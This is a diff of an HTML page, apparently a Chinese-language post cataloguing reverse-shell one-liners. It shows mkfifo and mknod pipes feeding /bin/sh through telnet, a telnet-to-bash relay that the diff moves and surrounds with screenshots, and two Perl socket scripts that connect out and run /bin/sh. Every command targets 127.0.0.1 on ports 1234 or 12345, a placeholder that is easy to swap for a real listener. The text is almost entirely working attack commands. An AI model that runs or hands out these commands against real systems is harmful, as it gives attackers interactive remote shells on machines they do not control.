@@ -133,10 +133,13 @@ base64搞一下命令
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
 
-telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
-
 rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="m">1</span>&gt;/tmp/bkpipe
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG59.jpeg"/>
+<img alt="agent" class="img-fluid" src="../images/WechatIMG60.jpeg"/></p>
+<div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
+</pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG61.jpeg"/></p>
 <div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 
 <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:[1234]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
